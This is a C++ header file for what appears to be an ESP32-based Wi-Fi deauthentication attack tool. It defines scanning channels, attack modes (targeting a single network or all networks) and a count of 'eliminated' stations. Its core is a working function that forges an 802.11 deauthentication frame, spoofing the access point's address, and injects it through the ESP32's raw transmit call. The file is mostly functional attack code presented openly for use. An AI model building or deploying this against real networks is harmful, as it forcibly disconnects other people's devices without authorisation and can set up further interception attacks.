#ifndef MAIN_HPP
#define MAIN_HPP

#include <stdint.h>
#include <esp_wifi.h>
#include <esp_wifi_default.h>
#include <esp_wifi_types.h>
#include <esp_wifi_netif.h>
#include <esp_mem.h>
#include <EEPROM.h>

// Define wifi constants
#define LED_PIN 2
const int CHANNEL_MAX = 11;
const int NUM_FRAMES_PER_DEAUTH = 16;
const int DEAUTH_BLINK_TIMES = 2;
const int DEAUTH_BLINK_DURATION = 20;
const int DEAUTH_TYPE_SINGLE = 0;
const int DEAUTH_TYPE_ALL = 1;
const int MAXIMUM_AP = 20;

uint32_t MS_PER_CHAN = 300U;
const int TIME_TO_SLEEP = 300;
const int SCAN_ROUNDS = 5;
static const char *TAG = "scan";
#define CHANNEL_LIST_SIZE 5
#define MAX_LIST_SIZE 0x32
#define DEAUTH_REASON 0x06
const uint16_t SCAN_RESULT_MAX = 72;
static uint8_t CHANNEL_LIST[CHANNEL_LIST_SIZE] = {1, 3, 6, 9, 11};

#define DEAUTH_REASON 0x06

// Deauth Constants
// -----------------------------------------
void start_deauth(int wifi_number, uint16_t reason);
void stop_deauth();

extern int eliminated_stations;
extern int deauth_type;

static void deauthESP(const uint8_t *bssid, const uint8_t *sta)
{
    struct __attribute__((packed))
    {
        uint8_t frame_control[2];
        uint8_t duration[2];
        uint8_t addr1[6]; // destination (STA)
        uint8_t addr2[6]; // source   (AP/BSSID)
        uint8_t addr3[6]; // BSSID
        uint8_t sequence_control[2];
        uint8_t reason_code[2];
    } deauthFrame;

    deauthFrame.frame_control[0] = 0xC0;
    deauthFrame.frame_control[1] = 0x00;
    deauthFrame.duration[0] = 0xFF;
    deauthFrame.duration[1] = 0xFF;
    memcpy(deauthFrame.addr1, sta, 6);
    memcpy(deauthFrame.addr2, bssid, 6);
    memcpy(deauthFrame.addr3, bssid, 6);
    deauthFrame.sequence_control[0] = 0x00;
    deauthFrame.sequence_control[1] = 0x00;
    deauthFrame.reason_code[0] = 0x06;
    deauthFrame.reason_code[1] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA,
                      reinterpret_cast<uint8_t *>(&deauthFrame),
                        sizeof(deauthFrame),
                        true);
}

// esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records);

// Power Save Constants
// -----------------------------------------
#define uS_TO_S_FACTOR (uint64_t)1000000
// #define uS_TO_S_FACTOR 1000000ULL

#define SERIAL_DEBUG

#ifdef SERIAL_DEBUG
#define DEBUG_PRINT(...) Serial.print(__VA_ARGS__)
#define DEBUG_PRINTLN(...) Serial.println(__VA_ARGS__)
#define DEBUG_PRINTF(...) Serial.printf(__VA_ARGS__)
#endif
#ifndef SERIAL_DEBUG
#define DEBUG_PRINT(...)
#define DEBUG_PRINTLN(...)
#define DEBUG_PRINTF(...)
#endif
#ifdef LED_PIN
#define BLINK_LED(num_times, blink_duration) blink_led(num_times, blink_duration)
#endif
#ifndef LED_PIN
#define BLINK_LED()
#endif

#endif
